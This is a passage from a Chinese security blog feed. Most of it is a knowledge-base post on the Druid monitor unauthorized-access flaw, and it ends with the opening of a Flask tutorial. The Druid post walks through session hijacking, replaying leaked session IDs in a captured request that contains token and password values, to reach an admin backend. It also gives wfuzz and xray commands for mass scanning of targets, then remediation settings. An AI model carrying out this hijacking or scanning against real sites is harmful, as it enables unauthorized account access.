src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2013.58.24.png" alt="局域网测试" style="zoom:30%;"><p>【局域网测试】</p><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ul><li><p><a href="https://github.com/wy876/POC/blob/main/Grafana/Grafana%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C(CVE-2024-9264).md">https://github.com/wy876/POC/blob/main/Grafana/Grafana%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C(CVE-2024-9264).md</a></p></li><li><p><a href="https://securityonline.info/grafana-vulnerability-cve-2024-9264-poc-released-for-9-9-rated-critical-flaw/">https://securityonline.info/grafana-vulnerability-cve-2024-9264-poc-released-for-9-9-rated-critical-flaw/</a></p></li><li><p><a href="https://ti.dbappsecurity.com.cn/info/8330">https://ti.dbappsecurity.com.cn/info/8330</a></p></li><li><p><a href="https://forum.butian.net/article/618">https://forum.butian.net/article/618</a> 【重点参考】</p></li><li><p><a href="https://grafana.com/blog/2024/10/17/grafana-security-release-critical-severity-fix-for-cve-2024-9264/">https://grafana.com/blog/2024/10/17/grafana-security-release-critical-severity-fix-for-cve-2024-9264/</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞知识库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞知识库 </tag>
            
            <tag> Grafana表达式远程代码执行(CVE-2024-9264) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Druid未授权访问漏洞</title>
      <link href="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/"/>
      <url>/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="一、Druid简介"><a href="#一、Druid简介" class="headerlink" title="一、Druid简介"></a>一、Druid简介</h1><p><strong>Druid</strong> 是由阿里巴巴开发的一个高性能、分布式的数据库连接池（DataSource），主要用于 Java 应用程序中数据库连接的管理和优化。Druid 在功能、性能、稳定性和监控方面表现突出，是目前 Java 开发中常用的数据库连接池之一。</p><blockquote><p><strong>1）什么是数据库连接池？</strong></p><p><strong>数据库连接池（Database Connection Pool）</strong> 是一种用于管理和优化数据库连接的技术，它通过<strong>复用</strong>一组数据库连接，减少频繁创建和关闭数据库连接的开销，从而提升应用程序与数据库之间的性能和稳定性。</p><p><strong>2）为什么需要数据库连接池？</strong></p><p>在与数据库交互的过程中，建立一个新的数据库连接通常是一个<strong>开销较大</strong>的操作，主要包括以下步骤：</p><ol><li>创建数据库连接对象。</li><li>进行网络通信，验证身份。</li><li>分配资源（如内存、线程）。</li><li>关闭连接，释放资源。</li></ol><p>如果每次数据库操作都重新建立连接，尤其是在<strong>高并发环境</strong>下，会导致以下问题：</p><ul><li><strong>性能瓶颈</strong>：频繁建立和释放连接占用大量系统资源，影响响应速度。</li><li><strong>资源浪费</strong>：每个连接都占用一定的内存、CPU、网络资源，频繁操作可能导致资源耗尽。</li><li><strong>连接泄漏</strong>：如果连接未及时关闭，可能导致数据库连接耗尽，进而导致应用程序崩溃。</li></ul><p>为了解决这些问题，<strong>数据库连接池</strong>应运而生。</p><p>3）<strong>数据库连接池的工作原理？</strong></p><ol><li><strong>初始化连接池</strong>：应用程序启动时，连接池会创建一组数据库连接并保持它们处于空闲状态。这些连接会被缓存以供重复使用。</li><li><strong>分配连接</strong>：当应用程序需要与数据库交互时，从连接池中<strong>取出一个空闲连接</strong>，而不是新建一个连接。</li><li><strong>释放连接</strong>：操作完成后，应用程序不会关闭连接，而是将连接<strong>归还到连接池</strong>，供其他请求重复使用。</li><li><strong>连接维护</strong>：连接池会定期检测空闲连接的状态，<strong>移除无效连接</strong>，并根据需求动态增加或减少连接数量。</li></ol><p>数据库连接池是现代 Java 应用程序中不可或缺的组件，能够显著提升数据库访问性能、节省资源，并提高应用程序的并发能力。常见的连接池实现如 Druid、HikariCP 等，已经成为企业级开发的标配。</p></blockquote><h2 id="1-1-核心功能"><a href="#1-1-核心功能" class="headerlink" title="1.1 核心功能"></a>1.1 核心功能</h2><ol><li><p><strong>数据库连接池管理</strong><br>提供了灵活高效的数据库连接池管理，支持多种数据库（如 MySQL、PostgreSQL、Oracle、SQL Server 等），并能够有效管理数据库连接的生命周期。</p></li><li><p><strong>SQL 监控和统计</strong><br>内置了强大的 SQL 监控功能，能够记录 SQL 执行情况、慢查询、执行时间、错误等信息，帮助开发者优化 SQL 性能。</p><p>（监控SQL的执行时间、监控Web URI的请求、Session监控）</p></li><li><p><strong>SQL 防火墙</strong><br>提供了 SQL 防火墙功能，可以防止 SQL 注入攻击和不安全的 SQL 操作，确保数据库的安全性。</p></li><li><p><strong>高效的性能</strong><br>Druid 对连接池性能进行了优化，特别是在高并发和大规模应用场景下，具有更好的性能和稳定性。</p></li><li><p><strong>内存管理</strong><br>提供了对内存使用情况的监控和管理，支持自动清理无用连接，降低内存泄漏的风险。</p></li><li><p><strong>扩展性和灵活性</strong><br>Druid 提供了丰富的配置选项，支持多种扩展机制，开发者可以根据需求自定义连接池行为。</p></li></ol><h2 id="1-2-Druid-的组件"><a href="#1-2-Druid-的组件" class="headerlink" title="1.2 Druid 的组件"></a>1.2 Druid 的组件</h2><ol><li><strong>DruidDataSource</strong>：核心组件，负责数据库连接的管理。</li><li><strong>Druid Monitor</strong>：内置的 Web 监控页面，提供 SQL 执行、连接池状态等实时监控数据。</li><li><strong>Druid Filter</strong>：可自定义的过滤器链，支持监控、日志、SQL 防火墙等功能扩展。</li></ol><h2 id="1-3-主要优点"><a href="#1-3-主要优点" class="headerlink" title="1.3 主要优点"></a>1.3 主要优点</h2><ul><li><strong>易用性</strong>：配置简单，集成方便。</li><li><strong>高性能</strong>：对 JDBC 操作进行了多项优化，提升数据库访问速度。</li><li><strong>强大的监控能力</strong>：内置监控功能，无需额外配置。</li><li><strong>安全性</strong>：内置 SQL 防火墙，减少安全隐患。</li></ul><h2 id="1-4-Druid-的使用场景"><a href="#1-4-Druid-的使用场景" class="headerlink" title="1.4 Druid 的使用场景"></a>1.4 Druid 的使用场景</h2><ul><li>大型互联网应用的数据库连接管理。</li><li>需要高并发访问数据库的分布式系统。</li><li>需要监控和优化 SQL 性能的企业级应用。</li></ul><h1 id="二、Druid未授权访问漏洞"><a href="#二、Druid未授权访问漏洞" class="headerlink" title="二、Druid未授权访问漏洞"></a>二、Druid未授权访问漏洞</h1><p>在日常的威胁告警分析中经常看到有攻击者在使用扫描工具进行druid未授权访问的测试，所以想借机会学习一下该漏洞的成因、特征、危害、利用方法和修复方法。</p><h2 id="2-1-漏洞成因"><a href="#2-1-漏洞成因" class="headerlink" title="2.1 漏洞成因"></a>2.1 漏洞成因</h2><p>Druid未授权访问漏洞是由于当开发者配置不当、权限控制失效导致的。</p><h2 id="2-2-漏洞特征"><a href="#2-2-漏洞特征" class="headerlink" title="2.2 漏洞特征"></a>2.2 漏洞特征</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://www.xxxx.com/druid/index.htmlhttps://****.bl******.com.cn/***-***-service/druid/index.htmlhttp://****.bl******.com.cn/***-****-view/<span class="token comment">#/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="2-3-漏洞危害"><a href="#2-3-漏洞危害" class="headerlink" title="2.3 漏洞危害"></a>2.3 漏洞危害</h2><p>通过DruidMonitor未授权访问可获取管理员信息。</p><h2 id="2-4-漏洞利用"><a href="#2-4-漏洞利用" class="headerlink" title="2.4 漏洞利用"></a>2.4 漏洞利用</h2><p>整体思路：通过Druid Monitor未授权访问找到SESSION监控页面下面的一些SESSION信息和URI监控下的路径，以及通过配合目标网站大数据产品平台的登录等一系列测试，可获得一起管理员以及其他注册成员信息。</p><h3 id="1）未授权访问index-html界面"><a href="#1）未授权访问index-html界面" class="headerlink" title="1）未授权访问index.html界面"></a>1）未授权访问index.html界面</h3><p>首先，是未授权的访问界面，主要关注Session监控和URI监控这两个地方，如图：</p><img src="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2024-12-05%2013.51.05.png" alt="session监控信息泄漏" style="zoom:50%;"><p>存在大量被泄漏的session信息及其对应访问的IP地址。不管是登陆成功的，没登陆成功的，还是失效的都会储存在这里。</p><p>优先选择暴露在互联网的进行利用。</p><h3 id="2）通过session完成攻击面的扩展"><a href="#2）通过session完成攻击面的扩展" class="headerlink" title="2）通过session完成攻击面的扩展"></a>2）通过session完成攻击面的扩展</h3><p>例如有一些敏感的SessionId。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">0b055336<span class="token operator">-</span>85f8<span class="token operator">-</span>4bdc<span class="token operator">-</span><span class="token number">8008</span><span class="token operator">-</span>d45dc23c6b2f7a5681a1<span class="token operator">-</span>a790<span class="token operator">-</span>47fa<span class="token operator">-</span>948b<span class="token operator">-</span>a1f1a3532d09  3aaaa4d3<span class="token operator">-</span><span class="token number">1259</span><span class="token operator">-</span><span class="token number">4e64</span><span class="token operator">-</span>835d<span class="token operator">-</span>fb1f9bf35eda<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>同时，URI监控的页面会泄漏一些URI登录地址，通过session替换进行登录，观察效果。</p><img src="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2024-12-05%2013.55.49.png" alt="URI监控信息泄漏" style="zoom:50%;"><p>如：membership/index 页面，构造数据包进行测试。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">POST</span> <span class="token comment">/********-service/me****ship/index/ HTTP/1.1Host: *****.bl*******.com.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101Firefox/79.0Accept: application/json, text/plain, */</span><span class="token operator">*</span>Accept<span class="token operator">-</span>Language<span class="token operator">:</span> zh<span class="token operator">-</span><span class="token constant">CN</span><span class="token punctuation">,</span>zh<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">,</span>zh<span class="token operator">-</span><span class="token constant">TW</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.7</span><span class="token punctuation">,</span>zh<span class="token operator">-</span><span class="token constant">HK</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span>en<span class="token operator">-</span><span class="token constant">US</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.3</span><span class="token punctuation">,</span>en<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.2</span>Accept<span class="token operator">-</span>Encoding<span class="token operator">:</span> gzip<span class="token punctuation">,</span> deflateContent<span class="token operator">-</span>Type<span class="token operator">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded<span class="token punctuation">;</span> charset<span class="token operator">=</span><span class="token constant">UTF</span><span class="token operator">-</span><span class="token number">8</span>Content<span class="token operator">-</span>Length<span class="token operator">:</span> <span class="token number">101</span><span class="token literal-property property">Origin</span><span class="token operator">:</span> http<span class="token operator">:</span><span class="token operator">/</span><span class="token comment">/***p.********.com.c*Connection: closeReferer: http://*****.bl*******.com.cn/******-view/Cookie: Hm_lvt_ed752fa41bdfde359bfde28ccd27b888=1597904479,1597907505;sid=0b055336-85f8-4bdc-8008-d45dc23c6b2f;token=029d8a6ac03358de6e57c7254acbd017;username=80560478&amp;password=FSMBKxmUSkq9MfJjyAgyEA%3D%3D&amp;isCookieLogin=Y&amp;validationCode=anqr&amp;brand=999</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Cookie中的sid参数，即为session里面监控找到的数据。</p><p>BP分析请求和响应：</p><img src="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2024-12-05%2013.59.42.png" alt="BP分析请求和响应" style="zoom:50%;"><img src="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2024-12-05%2014.00.34.png" alt="BP分析请求和响应" style="zoom:50%;"><p>可以发现用在Session监控下收集的数据，替换过后，可以得到用户名和用户ID。</p><h3 id="3）利用获取的信息登录管理后台"><a href="#3）利用获取的信息登录管理后台" class="headerlink" title="3）利用获取的信息登录管理后台"></a>3）利用获取的信息登录管理后台</h3><p>我们使用获取用户id，登录对应网站的后台/其他敏感系统。</p><p>密码随便填写，抓包，扔到repeater模块。</p><img src="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2024-12-05%2014.04.34.png" alt="抓包" style="zoom:50%;"><p>不出意外会提示密码错误。</p><p>此时，将sessionid（sid）替换为获取的session信息，username与之对应的账号。</p><img src="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2024-12-05%2014.06.00.png" alt="抓包更改sessionid" style="zoom:50%;"><img src="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2024-12-05%2014.06.27.png" alt="抓包更改sessionid" style="zoom:50%;"><p>最终可以看到成功登录到后台页面。</p><h1 id="三、批量验证Druid未授权访问漏洞"><a href="#三、批量验证Druid未授权访问漏洞" class="headerlink" title="三、批量验证Druid未授权访问漏洞"></a>三、批量验证Druid未授权访问漏洞</h1><h2 id="3-1-域名收集"><a href="#3-1-域名收集" class="headerlink" title="3.1 域名收集"></a>3.1 域名收集</h2><p>使用Oneforall（挂代理）或其他域名搜集工具收集域名，收集好的域名存入txt。</p><h2 id="3-2-验证域名存活性"><a href="#3-2-验证域名存活性" class="headerlink" title="3.2 验证域名存活性"></a>3.2 验证域名存活性</h2><p>WFUZZ进一步验证子域名的存活性</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wufzz <span class="token parameter variable">-w</span> 子域名.txt <span class="token parameter variable">--hw</span> <span class="token number">0</span> <span class="token parameter variable">--hc</span> <span class="token number">500,501</span>,502,504,505,400 <span class="token parameter variable">-Z</span> <span class="token parameter variable">-L</span> <span class="token parameter variable">-f</span> 输出.txt --conn-delay <span class="token number">5</span> http://FUZZ注意：使用--conn-delay <span class="token number">5</span>：为设置超时5秒后跳过，默认是90秒。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>参数详解：</p><p>这条命令是使用 <code>wufuzz</code> 工具进行模糊测试（fuzzing）的命令行示例。<code>wufuzz</code> 是一个基于 Python 的网络模糊测试工具，用于自动化发现Web应用程序中的安全漏洞。下面是命令中各个参数的含义：</p><ul><li><code>wufzz</code>：这是 <code>wufuzz</code> 工具的命令行调用。</li><li><code>-w 子域名.txt</code>：指定一个包含子域名的文件，<code>wufuzz</code> 将使用这些子域名作为测试的输入。</li><li><code>--hw 0</code>： <code>--hw</code> 参数用于隐藏响应中字数符合指定条件的响应。具体来说，<code>--hw</code> 参数后面跟随的是一个数字或数字范围，表示如果响应内容的字数等于或超过这个数字时，该响应将被隐藏，不会被显示出来。<code>--hw 0</code> 表示隐藏所有响应内容字数为0的响应。这通常意味着服务器没有返回任何内容，可能是服务器错误或者请求没有成功到达服务器。这个参数对于在进行模糊测试时过滤掉那些没有实际意义的响应是很有用的，比如空响应或者非常常见的错误响应，从而使测试者能够更专注于那些可能表明潜在漏洞或配置错误的响应。</li><li><code>--hc 500,501,502,504,505,400</code>：指定要忽略的 HTTP 响应代码。在这个例子中，<code>wufuzz</code> 将忽略 500、501、502、504、505 和 400 状态码的响应。</li><li><code>-Z</code>：这个参数的作用是使 <code>wufuzz</code> 在发现一个有效的响应时，不立即停止，而是继续测试，直到所有的测试用例都执行完毕。</li><li><code>-L</code>：这个参数的作用是在发现一个有效的响应时，打印出请求和响应的详细信息。</li><li><code>-f 输出.txt</code>：将发现的漏洞或有效响应保存到指定的文件中。</li><li><code>--conn-delay 5</code>：设置两次连续请求之间的延迟时间为 5 秒。这有助于减少对目标服务器的压力，并避免因请求频率过高而被服务器限制。</li><li><code>http://FUZZ</code>：这是要测试的 URL 模板，<code>FUZZ</code> 是一个占位符，<code>wufuzz</code> 会用 <code>子域名.txt</code> 文件中的子域名替换它，生成完整的 URL 进行测试。</li></ul><p>综上所述，这条命令的作用是：使用 <code>wufuzz</code> 对一个或多个子域名进行模糊测试，测试过程中忽略特定的 HTTP 状态码，设置超时和请求延迟，并将发现的漏洞或有效响应保存到文件中。这种类型的测试通常用于发现 Web 应用程序中的安全漏洞，如路径遍历、信息泄露等。</p></blockquote><p>预处理一下wufzz的输出结果：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">spl</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span>saveFile<span class="token punctuation">)</span><span class="token punctuation">:</span>    openFile <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span>    saveFile <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>saveFile<span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span>    lines <span class="token operator">=</span> openFile<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> lines<span class="token punctuation">:</span>        x <span class="token operator">=</span> i<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        x1 <span class="token operator">=</span> <span class="token string">"http://"</span> <span class="token operator">+</span> x        saveFile<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span>x1<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>x1<span class="token punctuation">)</span>    saveFile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    openFile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    filePath <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Input your filepath: "</span><span class="token punctuation">)</span>    savePath <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Sava File name: "</span><span class="token punctuation">)</span>    spl<span class="token punctuation">(</span>filePath<span class="token punctuation">,</span>savePath<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hey BOY,Fighiting@@@"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-3-xray批量扫描"><a href="#3-3-xray批量扫描" class="headerlink" title="3.3 xray批量扫描"></a>3.3 xray批量扫描</h2><p>Xray单独开启Druid检测插件，进行批量检测：</p><p>把config.yaml中其他检测都关掉，比如SQL注入，XSS注入等等，可以更快的更有针对性只针对Druid未授权进行检测。</p><img src="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2024-12-05%2014.17.48.png" alt="config.yaml配置" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./xray webscan <span class="token parameter variable">--poc</span> poc-yaml-druid-monitor-unauth--url-file ./存活的子域名.txt --html-output test.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>命令详解：</p><p><code>xray</code> 是一个安全评估工具，由长亭科技开发，用于自动化地发现和利用 Web 应用中的安全漏洞。下面是命令中各个参数的含义：</p><ul><li><code>./xray</code>：这是调用 <code>xray</code> 工具的命令行调用。</li><li><code>webscan</code>：这是 <code>xray</code> 的一个子命令，用于执行 Web 应用的安全扫描。</li><li><code>--poc</code>：指定要使用的漏洞检测规则（Proof of Concept，简称 PoC），在这个例子中，<code>poc-yaml-druid-monitor-unauth</code> 是一个 YAML 文件，包含了针对 Druid 监控未授权访问漏洞的检测规则。</li><li><code>--url-file</code>：指定一个包含 URL 的文件，<code>xray</code> 将使用这些 URL 作为测试的目标。</li><li><code>./存活的子域名.txt</code>：这是包含存活子域名的文件路径，<code>xray</code> 将读取这个文件中的 URL 并针对它们执行安全扫描。</li><li><code>--html-output</code>：指定输出结果的 HTML 文件路径。</li><li><code>test.html</code>：这是输出结果的 HTML 文件名，<code>xray</code> 将把扫描结果以 HTML 格式保存到这个文件中。</li></ul><p>综上所述，这条命令的作用是：使用 <code>xray</code> 工具，配合 Druid 监控未授权访问漏洞的检测规则，对存活的子域名列表中的每个 URL 进行安全扫描，并将扫描结果以 HTML 格式输出到 <code>test.html</code> 文件中。这种类型的扫描可以帮助发现 Web 应用中的安全漏洞，特别是针对 Druid 监控未授权访问的漏洞。</p></blockquote><h1 id="四、Druid未授权访问漏洞的修复"><a href="#四、Druid未授权访问漏洞的修复" class="headerlink" title="四、Druid未授权访问漏洞的修复"></a>四、Druid未授权访问漏洞的修复</h1><ul><li><strong>方法1</strong>：设置StatViewServlet（监控页面）为<code>false</code>，即禁用监控页面。</li></ul><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>  <span class="token key atrule">datasource</span><span class="token punctuation">:</span>    <span class="token key atrule">druid</span><span class="token punctuation">:</span>      <span class="token key atrule">stat-view-servlet</span><span class="token punctuation">:</span>        <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span> <span class="token comment"># 是否启用StatViewServlet(监控页面)</span>        <span class="token key atrule">reset-enable</span><span class="token punctuation">:</span> <span class="token boolean important">false</span> <span class="token comment"># 禁用HTML页面上的"Reset All"功能</span>        <span class="token key atrule">login-username</span><span class="token punctuation">:</span> xxxx <span class="token comment"># 设置账户名称（增加登录权限）</span>        <span class="token key atrule">login-password</span><span class="token punctuation">:</span> xxxxxxxx <span class="token comment"># 设置账户密码</span>        <span class="token key atrule">allow</span><span class="token punctuation">:</span> 127.0.0.1 <span class="token comment"># IP白名单</span>        <span class="token key atrule">deny</span><span class="token punctuation">:</span> 10.0.0.1 <span class="token comment"># IP黑名单</span>        <span class="token key atrule">url-pattern</span><span class="token punctuation">:</span> <span class="token string">'/druid/*'</span> <span class="token comment"># 自定义Druid连接</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>方法2</strong>：给Druid的Web页面设置账户密码，增加访问Druid的权限。这种方法推荐使用，因为它允许在鉴权后仍然能够查看监控信息。</li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://github.com/alibaba/druid">Druid 官方文档</a></li><li><a href="https://developer.aliyun.com/">https://developer.aliyun.com/</a> 阿里云开发者社区</li><li><a href="https://cloud.tencent.com/developer/article/1771986">https://cloud.tencent.com/developer/article/1771986</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞知识库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞知识库 </tag>
            
            <tag> Druid未授权访问 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flask框架</title>
      <link href="/2024/12/04/qian-hou-duan-kai-fa/flask-kuang-jia/"/>
      <url>/2024/12/04/qian-hou-duan-kai-fa/flask-kuang-jia/</url>
      
        <content type="html"><![CDATA[<h1 id="一、Flask简介"><a href="#一、Flask简介" class="headerlink" title="一、Flask简介"></a>一、Flask简介</h1><h2 id="1-1-什么是Flask？"><a href="#1-1-什么是Flask？" class="headerlink" title="1.1 什么是Flask？"></a>1.1 什么是Flask？</h2><p>Flask 是一个用 <strong>Python</strong> 编写的轻量级 Web 应用框架。它遵循 <strong>WSGI（Web Server Gateway Interface）</strong> 规范，并使用 <strong>Jinja2</strong> 模板引擎。Flask 的设计哲学是简单、灵活、可扩展，适用于从简单的原型开发到复杂的 Web 应用。</p><h2 id="1-2-Flask-的特点"><a href="#1-2-Flask-的特点" class="headerlink" title="1.2  Flask 的特点"></a>1.2  Flask 的特点</h2><ul><li><p><strong>轻量级</strong>：Flask 是一个微框架（Microframework），本身只提供核心功能，其他功能通过扩展实现，避免了不必要的功能加载。</p></li><li><p><strong>灵活性</strong>：Flask 不强制开发者遵循固定的目录结构或编程风格，开发者可以根据需要自由定制。</p></li><li><p><strong>内置开发服务器</strong>：提供一个简单的开发服务器，便于快速启动和调试。</p></li><li><p><strong>扩展性</strong>：支持丰富的扩展库，如数据库、认证、表单验证等，这些扩展可与 Flask 无缝集成。</p></li><li><p><strong>Jinja2 模板引擎</strong>：支持动态 HTML 页面生成。</p></li><li><p><strong>路由管理</strong>：内置路由功能，便于 URL 映射到视图函数。</p></li></ul><h2 id="1-3-核心组件"><a href="#1-3-核心组件" class="headerlink" title="1.3 核心组件"></a>1.3 核心组件</h2><ul><li><p><strong>Flask 核心对象</strong>：<code>Flask</code> 类用于创建应用实例。</p></li><li><p><strong>路由（Routing）</strong>：使用 <code>@app.route</code> 装饰器定义 URL 与视图函数的映射。</p></li><li><p><strong>模板引擎</strong>：使用 Jinja2 渲染 HTML 模板，并支持变量替换和控制结构（如循环、条件）。</p></li><li><p><strong>请求与响应</strong>：<code>request</code> 对象用于处理 HTTP 请求，<code>response</code> 对象用于返回响应。</p></li><li><p><strong>错误处理</strong>：内置错误处理机制，可自定义错误页面。</p></li></ul><h2 id="1-4-Flask的主要扩展"><a href="#1-4-Flask的主要扩展" class="headerlink" title="1.4 Flask的主要扩展"></a>1.4 Flask的主要扩展</h2><ul><li><p><strong>Flask-SQLAlchemy</strong>：ORM（对象关系映射）工具，用于数据库操作。</p></li><li><p><strong>Flask-WTF</strong>：处理表单和 CSRF 防护。</p></li><li><p><strong>Flask-Login</strong>：用户认证与管理。</p></li><li><p><strong>Flask-Migrate</strong>：数据库迁移管理。</p></li><li><p><strong>Flask-Mail</strong>：处理邮件发送。</p></li></ul><h2 id="1-5-适用场景"><a href="#1-5-适用场景" class="headerlink" title="1.5 适用场景"></a>1.5 适用场景</h2><ul><li><strong>快速原型开发</strong>：Flask 轻量、灵活，非常适合快速验证产品概念。</li><li><strong>API 开发</strong>：使用 Flask 可以快速构建 RESTful API 服务。</li><li><strong>小型 Web 应用</strong>：适合开发中小型网站或应用程序。</li><li><strong>微服务架构</strong>：由于其轻量和扩展性，Flask 是构建微服务的理想选择。</li></ul><blockquote><p>什么是RESTful API？</p><p>RESTful API是一种设计简洁、易于使用的网络接口风格，它通过HTTP方法（如GET、POST、PUT、DELETE）让客户端与服务器交换数据。这种接口风格遵循无状态、统一接口等原则，使得网络服务更直观、高效。</p><p>RESTful API通常使用以下HTTP方法：</p><ul><li><strong>GET</strong>：请求从服务器检索特定资源。GET请求应该是安全的，不会产生副作用。</li><li><strong>POST</strong>：向服务器提交数据以创建新资源。</li><li><strong>PUT</strong>：更新服务器上的现有资源或创建新资源。</li><li><strong>DELETE</strong>：从服务器删除资源。</li><li><strong>PATCH</strong>：对资源进行部分修改。</li></ul><p>例子：</p><ol><li>GET /users：获取用户列表。</li><li>POST /users：创建新用户。</li><li>PUT /users/{id}：更新特定用户信息。</li><li>DELETE /users/{id}：删除特定用户。</li></ol><p>总的来说，RESTful API是一种设计简洁、易于理解和使用的API风格，它使得客户端和服务器之间的通信更加直观和高效。</p></blockquote><h2 id="1-6-与其他框架的对比"><a href="#1-6-与其他框架的对比" class="headerlink" title="1.6 与其他框架的对比"></a>1.6 与其他框架的对比</h2><img src="/2024/12/04/qian-hou-duan-kai-fa/flask-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-04%2017.07.10.png" alt="Flask vs Django vs FastAPI" style="zoom:50%;"><p>Flask 是一个非常适合快速开发、轻量级 Web 应用的框架。如果你需要一个简单易用、灵活可扩展的 Python Web 框架，Flask 是一个很好的选择。</p><h1 id="二、Flask-的基本应用结构"><a href="#二、Flask-的基本应用结构" class="headerlink" title="二、Flask 的基本应用结构"></a>二、Flask 的基本应用结构</h1><p>一个简单的 Flask 应用示例如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token comment"># 创建 Flask 应用实例</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token comment"># 定义路由与视图函数</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"Hello, Flask!"</span><span class="token decorator annotation 